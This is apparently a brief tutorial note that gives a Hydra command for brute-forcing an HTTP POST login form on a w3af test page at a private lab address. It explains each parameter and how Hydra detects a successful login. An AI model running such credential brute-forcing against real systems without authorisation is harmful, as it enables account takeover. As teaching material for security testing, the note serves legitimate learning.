Hydra brute-force attack as follows:

hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
                         // or get

If we break this up

Host = 192.168.1.69
Method = http-form-post
URL = /w3af/bruteforce/form_login/dataReceptor.php
Form parameters = user=^USER^&pass=^PASS^
Failure response = Bad login
Users file = users.txt
Password file = pass.txt
Threads = -t 10
Wait for timeout = -w 30
Output file = -o hydra-http-post-attack.txt

Hydra basically iterates through all the username/password combinations, until it gets a response that does not contain the text "Bad login".
